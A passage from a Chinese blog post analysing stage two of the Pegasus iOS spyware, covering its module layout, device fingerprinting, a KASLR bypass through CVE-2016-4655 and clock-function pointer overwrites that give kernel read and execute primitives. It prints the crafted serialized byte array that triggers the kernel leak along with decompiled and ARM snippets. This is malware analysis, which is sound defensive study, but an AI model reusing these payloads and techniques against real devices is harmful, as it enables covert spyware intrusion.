<p>由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在：</p>
<ol>
<li><strong>fs.c</strong> 加载跟文件还有文件系统操作方法例如<em>ftw,open,read,rename,mount</em>有关的API</li>
<li><strong>kaslr.c</strong> 加载API，如<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>，通过利用<em>io _ service _ open _ extended</em>函数中的漏洞，这些API来找到内核地址。</li>
<li><strong>bh.c </strong> 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 <em>BZ2 _ bzDecompress, chmod, and malloc</em></li>
<li><strong>safari.c </strong> 加载如<em>sync, exit, strcpy</em>API，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。</li>
</ol>
<p>上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。</p>
<h4 id="环境设置和平台确定"><a href="#环境设置和平台确定" class="headerlink" title="环境设置和平台确定"></a>环境设置和平台确定</h4><p>在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。</p>
<p>为了确定受害者设备的型号，调用了<em>sysctlbyname</em>获得<em>hw.machine</em>。另一个对<em>sysctlbyname</em>获取<em>kern.osversion </em>信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。</p>
<p>阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–<em>$HOME/tmp/lock</em>（注意：<em>$HOME</em>是一个程序独有变量）</p>
<p>32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。</p>
<h4 id="攻入KASLR"><a href="#攻入KASLR" class="headerlink" title="攻入KASLR"></a>攻入KASLR</h4><p>阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用<strong>CVE-2016-4655</strong>找到内核空间中的一个内存地址。</p>
<p>阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫<strong>AppleKeyStore</strong>的服务并调用<strong>IOServiceMatching</strong>，调用结果返回到<strong>IOServiceGetMatchingService </strong>，得到<strong>io _ service _ t</strong>对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用<strong>io_service_open_extended</strong>并将一段精心制作的属性字段传到服务中。这个字段是<strong>XML</strong>数据的串行化二进制表示，<strong>io_service_open_extended</strong>会将数据最终传到内核中的<strong>OSUnserializeBinary</strong>函数。<strong>OSUnserializeBinary</strong>里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。<strong>kOSSerializeNumber</strong>类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">												bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">												<span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">												value=next[<span class="number">1</span>];</span><br><span class="line">												value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">												value |= next[<span class="number">0</span>];</span><br><span class="line">												o = OSNumber::withNumber(value. len);</span><br><span class="line">												next+=<span class="number">2</span>;</span><br><span class="line">													<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<p>问题是<strong>len</strong>变量在传送到<strong>OSNumber::withNumber</strong>前是无效的。最终，<strong>OSNumber::init</strong>被调用，其会盲目信任用户控制的值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> OSNumber::init(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )&#123;</span><br><span class="line">	<span class="keyword">if</span> (!super::init())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	size=newNumberOfBits;</span><br><span class="line">	value=(inValue &amp; sizeMask);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个漏洞让阶段二可以控制OSNumber的大小。<strong>io_service_open_extended</strong>为<strong>OSUnserializedBinary</strong>准备好了使用环境，通过<strong>OSUnserializedBinary</strong>来利用漏洞。在怎么利用前，先来看看传送到<strong>io_service_open_extended</strong>的恶意<strong>properties </strong>字段。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line">	<span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line">	<span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line">	<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line">	<span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">"HIDKeyboardModifierMappingSrc"</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 1</span></span><br><span class="line">	<span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(4)</span></span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line">	<span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line">	<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line">	<span class="string">"HIDKeyboardModifierMappingDst"</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line">	<span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="comment">//VALUE 2</span></span><br><span class="line">	<span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line">	<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line">	<span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line">	<span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>阶段二调用<em>IORegistryEntryGetProperty </em>来找到<em>HIDKeyboardModifierMappingSrc</em>的入口点，导致<strong>properties</strong>数组创建了超过最大值64bit的<strong>OSNumber</strong>值。阶段二用下列代码调用<em>is_ io_registry_entry_get_property_bytes</em>，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着<strong>IORegistryEntryGetProperty</strong>这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;<span class="keyword">while</span> (IORegistryEntryGetProperty_0(v13, <span class="string">"HIDKeyboardModifierMappingSrc"</span>,dataBuffer,&amp;size)</span><br><span class="line">);</span><br><span class="line">writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">127</span>);</span><br><span class="line"><span class="keyword">if</span>(size&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">	writeLog(<span class="number">7</span>,<span class="string">"%.2s%5.5d\n"</span>,<span class="string">"kaslr.c"</span>,<span class="number">138</span>);</span><br><span class="line">	<span class="keyword">return</span> dataBuffer[index]&amp;<span class="number">0xFFF00000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>需要特别注意这段代码的两个方面。第一，properties数组指定<strong>OSNumber</strong>的值是256字节大小，这个值会最终导致数据泄露。第二，<em>index</em>值会因型号和iOS版本不同而不同，这个值存储在<em>dataBuffer</em>中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定<em>dataBuffer</em>那个地址值是有效的内核地址。</p>
<p>如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。</p>
<h4 id="在受害设备上建立读-写-执行原语（32bit）"><a href="#在受害设备上建立读-写-执行原语（32bit）" class="headerlink" title="在受害设备上建立读/写/执行原语（32bit）"></a>在受害设备上建立读/写/执行原语（32bit）</h4><p>找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过<strong>host_get_clock_service</strong>得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。</p>
<p>紧跟着<em>pipe</em>和<em>host_get_clock_service calls</em>，32包检查向前通过<strong>task_from_pid</strong>创建的内核端口值。如果<strong>task_from_pid</strong>返回了一个有效值（不是NULL），32包用<em>vm_write</em>写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了<em>clock_ops</em>的一部分。</p>
<p>当调用例如<em>clock_get_attributes</em>函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的<em>getattr</em>操作语。特别的是，实时时钟的<em>getattr</em>被修改成指向<strong>OSSerializer::serialize</strong>的指针，电池时钟的<em>getattr</em>改成指向<strong>_bufattr_cpx</strong>的指针。</p>
<p>当两个时钟调用<em>clock_get_attributes</em>时，会改变其原有的执行结果。例如电池时钟调用<em>clock_get_attributes</em>时，相当与调用了内核空间读函数。<strong>_bufattr_cpx</strong>只有两个属性：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_bufattr_cpx:</span><br><span class="line">			LDR        R0,[R0]</span><br><span class="line">			BX          LR</span><br></pre></td></tr></table></figure></p>
<p>R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然<strong>getattr</strong>使用了三个参数，但缺少完全兼容的函数原型没有关系。</p>
<p>替代了实时时钟<strong>getattr</strong>的函数更加复杂。<strong>OSSerializer::serialize</strong>函数将<em>OSSerializer </em>对象（包含虚函数表（vtable））作为<em>this</em>指针。函数调用<em> OSSerializer </em>对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DWORD OSSerializer::serialize(OSSerialize *):</span><br><span class="line">		LDR      R3,[R0,#<span class="number">8</span>]</span><br><span class="line">		MOV    R2,R1</span><br><span class="line">		LDR      R1,[R0,#<span class="number">0xC</span>]</span><br><span class="line">		LDR.W  R12,[R0,#<span class="number">0x10</span>]</span><br><span class="line">		MOV     R0,R3</span><br><span class="line">		BX         R12</span><br></pre></td></tr></table></figure></p>
<p>通过一段特殊设计的数据块，接下来会详细谈到，现在调用<em>clock_get_attributes</em>就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。</p>
<p>如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。</p>
<p>64位包不会利用已越狱手机上的后门。</p>
	  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2019/03/29/penetration-test-report-interpretation/" type="button" class="btn btn-default ">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2019-04-16 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ios/">ios<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#PEGASUS攻击分析"><span class="toc-article-text">PEGASUS攻击分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-6"><a class="toc-article-link" href="#参考-lookout-report"><span class="toc-article-text">参考 lookout report</span></a></li></ol></li></ol><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#攻击过程"><span class="toc-article-text">攻击过程</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#阶段一"><span class="toc-article-text">阶段一</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#阶段二"><span class="toc-article-text">阶段二</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#阶段三"><span class="toc-article-text">阶段三</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CVE-2016-4657"><span class="toc-article-text">CVE-2016-4657</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#背景"><span class="toc-article-text">背景</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#攻击"><span class="toc-article-text">攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#设置触发漏洞"><span class="toc-article-text">设置触发漏洞</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#获取任意读写原语"><span class="toc-article-text">获取任意读写原语</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#获取对象地址"><span class="toc-article-text">获取对象地址</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#本地代码执行"><span class="toc-article-text">本地代码执行</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#回避检测"><span class="toc-article-text">回避检测</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#分析KASLR绕过"><span class="toc-article-text">分析KASLR绕过</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#32位和63位二进制包不同的地方"><span class="toc-article-text">32位和63位二进制包不同的地方</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#加载API"><span class="toc-article-text">加载API</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#环境设置和平台确定"><span class="toc-article-text">环境设置和平台确定</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#攻入KASLR"><span class="toc-article-text">攻入KASLR</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#在受害设备上建立读-写-执行原语（32bit）"><span class="toc-article-text">在受害设备上建立读/写/执行原语（32bit）</span></a></li></ol></li>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>
		

</div><!-- row -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2019 finsenty54
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.    
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
